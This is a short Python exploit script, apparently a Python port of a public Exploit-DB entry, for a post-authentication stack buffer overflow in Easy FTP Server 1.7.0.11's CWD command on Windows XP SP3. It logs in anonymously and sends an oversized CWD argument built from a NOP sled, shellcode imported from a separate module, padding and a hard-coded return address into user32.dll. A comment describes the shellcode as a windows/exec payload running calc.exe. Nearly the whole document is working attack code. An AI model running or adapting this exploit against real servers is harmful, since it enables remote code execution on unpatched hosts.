# Exploit Title: Easy FTP Server v1.7.0.11 CWD Command Remote Buffer Overflow Exploit (Post Auth) 
# Date: 2010-07-18 
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Software Link: 
# Version: 1.7.0.11
# Tested on: Windows XP SP3 en

import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):
	buffersize = 268
	target = target_machine
	port = target_port
	# windows/exec - 227 bytes x86/shikata_ga_nai EXITFUNC=process, CMD=calc.exe
	

	eip =b"\x91\xC8\x41\x7E" # CALL EDI - user32.dll
	nopsled = b"\x90" * 16

	payload = b"\x90" * (buffersize-(len(nopsled)+len(buf)))

	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, port))
	s.recv(1024)
	s.send(b'User anonymous\r\n')
	s.recv(1024)
	s.send(b'PASS anonymous\r\n')
	s.send(b'CWD '+nopsled+buf+payload+eip+b'\r\n')
	s.recv(1024)
	s.send(b'QUIT ftp\r\n')
	s.close()

	